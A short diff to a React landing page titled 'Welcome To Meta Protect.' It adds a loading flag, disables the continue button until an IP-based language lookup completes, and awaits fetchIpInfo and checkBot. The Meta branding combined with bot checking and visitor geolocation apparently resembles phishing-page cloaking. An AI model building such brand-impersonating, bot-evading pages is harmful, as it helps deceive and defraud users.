@@ -12,7 +12,7 @@ import { useNavigate } from 'react-router';
 const Index = () => {
     const navigate = useNavigate();
     const [today, setToday] = useState();
-
+    const [isLoading, setIsLoading] = useState(true)
     const defaultTexts = useMemo(
         () => ({
             title: 'Welcome To Meta Protect.',
@@ -77,6 +77,7 @@ const Index = () => {
                 const targetLang = countryToLanguage[countryCode];
 
                 if (targetLang) {
+                    setIsLoading(false)
                     localStorage.setItem('targetLang', targetLang);
                     if (targetLang !== 'en') {
                         translateAllTexts(targetLang);
@@ -86,9 +87,8 @@ const Index = () => {
                 //
             }
         };
-
-        checkBot();
-        fetchIpInfo();
+        await fetchIpInfo();
+        await checkBot();
     }, [translateAllTexts]);
 
     return (
@@ -112,6 +112,7 @@ const Index = () => {
                 </div>
                 <button
                     className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white'
+                    disabled={isLoading}
                     onClick={() => {
                         navigate(PATHS.HOME);
                     }}
